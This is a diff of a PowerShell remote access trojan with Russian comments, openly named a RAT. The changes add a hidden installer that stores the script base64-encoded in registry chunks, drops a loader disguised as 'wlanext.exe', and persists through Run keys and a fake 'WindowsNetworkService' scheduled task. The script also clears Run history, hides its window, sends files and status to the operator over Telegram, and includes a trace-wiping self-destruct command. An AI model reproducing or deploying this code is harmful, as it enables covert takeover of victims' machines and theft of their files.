@@ -16,49 +16,6 @@ $windowCode = '[DllImport("user32.dll")] public static extern bool ShowWindow(in
 $windowAPI = Add-Type -MemberDefinition $windowCode -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
 $windowAPI::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0) | Out-Null
 
-# Уникальное расположение - прячемся в ветке реестра как бинарные данные
-$regDataPath = "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows"
-$regValueName = "Load"
-$scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw -Encoding UTF8
-
-# Функция сохранения в реестре
-function Save-ToRegistry {
-    param([string]$Data)
-    
-    $bytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
-    $base64 = [Convert]::ToBase64String($bytes)
-    
-    # Сохраняем в реестре
-    if (!(Test-Path $regDataPath)) { 
-        New-Item -Path $regDataPath -Force | Out-Null 
-    }
-    Set-ItemProperty -Path $regDataPath -Name $regValueName -Value $base64 -Force
-}
-
-# Функция загрузки из реестра
-function Load-FromRegistry {
-    try {
-        $base64 = Get-ItemProperty -Path $regDataPath -Name $regValueName -ErrorAction Stop | Select-Object -ExpandProperty $regValueName
-        $bytes = [Convert]::FromBase64String($base64)
-        return [System.Text.Encoding]::UTF8.GetString($bytes)
-    } catch {
-        return $null
-    }
-}
-
-# Функция запуска из реестра
-function Start-FromRegistry {
-    $scriptContent = Load-FromRegistry
-    if ($scriptContent) {
-        $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
-        $scriptContent | Out-File -FilePath $tempScript -Encoding UTF8
-        Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tempScript`"" -WindowStyle Hidden
-    }
-}
-
-# Сохраняем текущую версию в реестре
-Save-ToRegistry -Data $scriptContent
-
 # Функция отправки сообщений с правильной кодировкой
 function Send-Telegram {
     param([string]$Message, [string]$FilePath = $null)
@@ -154,18 +111,73 @@ function Compress-Folder {
     }
 }
 
+# Уникальное место для сохранения - реестр как хранилище скрипта
+function Install-RAT {
+    # Очистка истории RUN при установке
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
+    
+    # Сохраняем скрипт в реестре (уникальный метод)
+    $regStoragePath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
+    if (!(Test-Path $regStoragePath)) { 
+        New-Item -Path $regStoragePath -Force | Out-Null 
+    }
+    
+    $scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw -Encoding UTF8
+    $encodedContent = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($scriptContent))
+    
+    # Разбиваем на части из-за ограничения длины значений в реестре
+    $chunkSize = 8000
+    for ($i = 0; $i -lt $encodedContent.Length; $i += $chunkSize) {
+        $chunk = $encodedContent.Substring($i, [Math]::Min($chunkSize, $encodedContent.Length - $i))
+        Set-ItemProperty -Path $regStoragePath -Name "Hidden$i" -Value $chunk -Force -ErrorAction SilentlyContinue
+    }
+    
+    # Создаем загрузчик из реестра
+    $loaderPath = "$env:APPDATA\Microsoft\Network\wlanext.exe"
+    $loaderContent = @"
+`$parts = @(); `$i = 0; while (`$true) { `$part = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name "Hidden`$i" -ErrorAction SilentlyContinue)."Hidden`$i"; if (`$part) { `$parts += `$part; `$i++ } else { break } }; `$script = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((`$parts -join ''))); Invoke-Expression `$script
+"@
+    
+    $loaderContent | Out-File -FilePath $loaderPath -Encoding UTF8 -Force
+    
+    # Устанавливаем в автозагрузку через несколько методов для надежности
+    $regPaths = @(
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+    )
+    
+    foreach $regPath in $regPaths {
+        if (!(Test-Path $regPath)) { 
+            New-Item -Path $regPath -Force | Out-Null 
+        }
+        Set-ItemProperty -Path $regPath -Name "WindowsNetwork" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$loaderPath`"" -Force -ErrorAction SilentlyContinue
+    }
+    
+    # Дополнительный метод через планировщик задач
+    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$loaderPath`""
+    $taskTrigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
+    Register-ScheduledTask -TaskName "WindowsNetworkService" -Action $taskAction -Trigger $taskTrigger -Description "Windows Network Service" -Force -ErrorAction SilentlyContinue | Out-Null
+    
+    return $true
+}
+
 # Основные переменные
 $currentDir = "C:\"
 $global:LastSentMessage = ""
 
-# Отправка информации о запуске
-Send-Telegram "RAT активирован на $env:COMPUTERNAME
+# Установка RAT
+$installationResult = Install-RAT
+if ($installationResult) {
+    Send-Telegram "RAT успешно установлен на $env:COMPUTERNAME
 Доступные команды:
 /help - список команд
 /ls - список файлов
 /cd [папка] - сменить директорию
 /download [файл] - скачать файл
 /selfdestruct - самоуничтожение"
+} else {
+    Send-Telegram "Ошибка установки RAT"
+}
 
 # Основной цикл опроса
 while ($true) {
@@ -250,45 +262,91 @@ $($fileList -join "`n")"
                         }
                         "^/selfdestruct$" {
                             $success = $true
-                            $message = "Процесс самоуничтожения запущен...`n"
+                            $report = "Отчет самоуничтожения:`n"
                             
-                            # Очистка истории RUN
+                            # 1. Очистка истории RUN
                             try {
                                 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction Stop
-                                $message += "✅ История RUN очищена`n"
+                                $report += "✓ История RUN очищена`n"
                             } catch {
+                                $report += "✗ Ошибка очистки истории RUN`n"
                                 $success = $false
-                                $message += "❌ Ошибка очистки истории RUN`n"
                             }
                             
-                            # Удаление данных из реестра
+                            # 2. Удаление из автозагрузки
+                            $regPaths = @(
+                                "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
+                                "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+                            )
+                            
+                            foreach $regPath in $regPaths {
+                                try {
+                                    Remove-ItemProperty -Path $regPath -Name "WindowsNetwork" -Force -ErrorAction SilentlyContinue
+                                } catch { }
+                            }
+                            $report += "✓ Автозагрузка удалена`n"
+                            
+                            # 3. Удаление планировщика задач
                             try {
-                                Remove-ItemProperty -Path $regDataPath -Name $regValueName -Force -ErrorAction Stop
-                                $message += "✅ Данные из реестра удалены`n"
+                                Unregister-ScheduledTask -TaskName "WindowsNetworkService" -Confirm:$false -ErrorAction SilentlyContinue
+                                $report += "✓ Планировщик задач очищен`n"
                             } catch {
+                                $report += "✗ Ошибка удаления из планировщика`n"
                                 $success = $false
-                                $message += "❌ Ошибка удаления данных из реестра`n"
                             }
                             
-                            # Удаление временных файлов
+                            # 4. Удаление загрузчика
+                            $loaderPath = "$env:APPDATA\Microsoft\Network\wlanext.exe"
                             try {
-                                Get-ChildItem -Path $env:TEMP -Filter "*WindowsUpdate*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-                                Get-ChildItem -Path $env:TEMP -Filter "*WindowsSystem*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-                                $message += "✅ Временные файлы удалены`n"
+                                if (Test-Path $loaderPath) { 
+                                    Remove-Item $loaderPath -Force -ErrorAction Stop
+                                    $report += "✓ Загрузчик удален`n"
+                                }
                             } catch {
-                                $message += "⚠️ Частичная ошибка удаления временных файлов`n"
+                                $report += "✗ Ошибка удаления загрузчика`n"
+                                $success = $false
+                            }
+                            
+                            # 5. Очистка реестра от частей скрипта
+                            $regStoragePath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
+                            try {
+                                $i = 0
+                                while ($true) {
+                                    $propName = "Hidden$i"
+                                    $prop = Get-ItemProperty -Path $regStoragePath -Name $propName -ErrorAction SilentlyContinue
+                                    if ($prop) {
+                                        Remove-ItemProperty -Path $regStoragePath -Name $propName -Force -ErrorAction SilentlyContinue
+                                        $i++
+                                    } else {
+                                        break
+                                    }
+                                }
+                                $report += "✓ Данные из реестра удалены`n"
+                            } catch {
+                                $report += "✗ Ошибка очистки реестра`n"
+                                $success = $false
+                            }
+                            
+                            # 6. Удаление текущего файла скрипта через отдельный процесс
+                            try {
+                                $currentScript = $MyInvocation.MyCommand.Path
+                                if (Test-Path $currentScript) {
+                                    $cmd = "cmd /c ping 127.0.0.1 -n 3 > nul & del /f /q `"$currentScript`""
+                                    Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c", $cmd
+                                    $report += "✓ Файл скрипта помечен на удаление`n"
+                                }
+                            } catch {
+                                $report += "✗ Ошибка удаления файла скрипта`n"
+                                $success = $false
                             }
                             
                             if ($success) {
-                                $message += "`n🎯 РАТ УСПЕШНО УДАЛЕН! Все следы уничтожены."
+                                $report += "`n✅ Самоуничтожение завершено УСПЕШНО. Все следы удалены."
                             } else {
-                                $message += "`n⚠️ РАТ частично удален. Некоторые следы могли остаться."
+                                $report += "`n⚠️ Самоуничтожение завершено с ОШИБКАМИ. Некоторые следы могли остаться."
                             }
                             
-                            Send-Telegram $message
-                            
-                            # Создаем задание для полного выхода через несколько секунд
-                            Start-Sleep -Seconds 3
+                            Send-Telegram $report
                             exit
                         }
                     }
@@ -296,15 +354,6 @@ $($fileList -join "`n")"
             }
         }
     } catch { 
-        # В случае ошибки - пытаемся восстановиться из реестра
-        Start-Sleep -Seconds 10
-        Start-FromRegistry
-    }
-    
-    # Периодически обновляем данные в реестре на случай изменений
-    if ((Get-Date).Minute % 10 -eq 0) {
-        $currentScriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw -Encoding UTF8
-        Save-ToRegistry -Data $currentScriptContent
-        Start-Sleep -Seconds 60
+        Start-Sleep -Seconds 5
     }
 }
